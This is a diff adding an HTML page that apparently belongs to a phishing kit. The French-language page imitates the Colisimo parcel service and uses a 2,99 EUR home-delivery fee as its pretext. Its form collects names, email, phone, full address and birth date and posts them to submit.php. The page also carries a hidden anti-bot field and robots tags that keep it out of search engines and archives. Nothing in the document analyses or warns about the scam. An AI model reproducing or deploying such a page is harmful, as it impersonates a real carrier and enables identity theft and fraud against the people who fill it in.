@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+  <meta "noarchive,"="" "nocache,"="" "nofollow,"="" "noimageindex,"="" "nosnippet"="" content="noindex," name="robots"/>
+  <!-- CSS FILES -->
+  <link href="../assets/css/bootstrap.min.css" rel="stylesheet"/>
+  <link href="../assets/css/helpers.css" rel="stylesheet"/>
+  <link href="../assets/css/fonts.css" rel="stylesheet"/>
+  <link href="../assets/css/main.css" rel="stylesheet"/>
+  <link href="../assets/images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  <title>
+   Authentification
+  </title>
+ </head>
+ <body>
+  <div id="page-wrapper">
+   <div class="left">
+    <img class="d-xl-block d-lg-none d-md-none d-sm-none d-none" src="../assets/images/left-img.png" style="min-width: 201px;"/>
+    <img class="d-xl-none d-lg-block d-md-block d-sm-block d-block" src="../assets/images/left-img2.png" style="min-width: 71px;"/>
+   </div>
+   <div class="right">
+    <header id="header">
+     <img src="../assets/images/header-left.png" style="min-width: 224px;"/>
+     <img class="d-xl-block d-lg-none d-md-none d-sm-none d-none" src="../assets/images/header-right.png" style="min-width: 929px; float: right;"/>
+     <img class="d-xl-none d-lg-block d-md-none d-sm-none d-none" src="../assets/images/header-right2.png" style="min-width: 521px; float: right;"/>
+    </header>
+    <main id="main">
+     <div class="title">
+      <h3>
+       Livraison &agrave; domicile (2,99 EUR)
+      </h3>
+      <p>
+       Colisimo vous permet le suivi de vos envois de colis &agrave; tout moment
+       <br/>
+       et ce depuis l'exp&eacute;dition jusqu'a la livraison.
+      </p>
+     </div>
+     <div class="details-box">
+      <div class="shadow-left">
+      </div>
+      <div class="shadow-right">
+      </div>
+      <p>
+       Tous les champs marqu&eacute;s par (*) sont obligatoires.
+      </p>
+      <form action="submit.php" method="post">
+       <input name="verbot" type="hidden"/>
+       <div class="form-row mb-4">
+        <div class="col-lg-6 col-md-6 col-sm-12 col-12 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
+         <div class="form-group mb-0">
+          <label for="last_name">
+           Nom *
+          </label>
+          <input class="form-control" id="last_name" name="last_name" placeholder="Votre nom" type="text" value=""/>
+         </div>
+        </div>
+        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
+         <div class="form-group mb-0">
+          <label for="first_name">
+           Pr&eacute;nom *
+          </label>
+          <input class="form-control" id="first_name" name="first_name" placeholder="Votre pr&eacute;nom" type="text" value=""/>
+         </div>
+        </div>
+       </div>
+       <div class="form-row mb-4">
+        <div class="col-lg-6 col-md-6 col-sm-12 col-12 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
+         <div class="form-group mb-0">
+          <label for="email">
+           Email *
+          </label>
+          <input class="form-control" id="email" name="email" placeholder="Votre email" type="text" value=""/>
+         </div>
+        </div>
+        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
+         <div class="form-group mb-0">
+          <label for="phone">
+           T&eacute;l&eacute;phone *
+          </label>
+          <input class="form-control" id="phone" name="phone" placeholder="Votre t&eacute;l&eacute;phone" type="text" value=""/>
+         </div>
+        </div>
+       </div>
+       <div class="form-row mb-4">
+        <div class="col-lg-6 col-md-6 col-sm-12 col-12 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
+         <div class="form-group mb-0">
+          <label for="city">
+           Ville *
+          </label>
+          <input class="form-control" id="city" name="city" placeholder="Ville" type="text" value=""/>
+         </div>
+        </div>
+        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
+         <div class="form-group mb-0">
+          <label for="zip_code">
+           Code postal *
+          </label>
+          <input class="form-control" id="zip_code" name="zip_code" placeholder="Code postal" type="text" value=""/>
+         </div>
+        </div>
+       </div>
+       <div class="form-row mb-5">
+        <div class="col-lg-6 col-md-6 col-sm-12 col-12 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
+         <div class="form-group mb-0">
+          <label for="address">
+           Adresse *
+          </label>
+          <input class="form-control" id="address" name="address" placeholder="Votre adresse" type="text" value=""/>
+         </div>
+        </div>
+        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
+         <div class="form-group mb-0">
+          <label for="birth_date">
+           Date de naissance (jj/mm/aaaa) *
+          </label>
+          <input class="form-control" id="birth_date" maxlength="10" name="birth_date" placeholder="Date de naissance (jj/mm/aaaa)" type="text" value=""/>
+         </div>
+        </div>
+       </div>
+       <input name="type" type="hidden" value="details"/>
+       <div class="text-right">
+        <button type="submit">
+         Continuer
+        </button>
+       </div>
+      </form>
+     </div>
+    </main>
+   </div>
+  </div>
+  <footer id="footer">
+   <div class="footer1">
+    <img src="../assets/images/features.png" style="min-width: 1153px;"/>
+   </div>
+   <div class="footer2">
+    <img src="../assets/images/social.png" style="min-width: 1153px;"/>
+   </div>
+   <div class="footer3">
+    <img src="../assets/images/footer-top.png" style="min-width: 1047px;"/>
+   </div>
+   <div class="footer4">
+    <img src="../assets/images/footer-bottom.png" style="min-width: 1163px;"/>
+   </div>
+  </footer>
+  <!-- JS FILES -->
+  <script src="../assets/js/jquery.min.js">
+  </script>
+  <script src="../assets/js/popper.min.js">
+  </script>
+  <script src="../assets/js/bootstrap.min.js">
+  </script>
+  <script src="../assets/js/fontawesome.min.js">
+  </script>
+  <script src="../assets/js/main.js">
+  </script>
+ </body>
+</html>
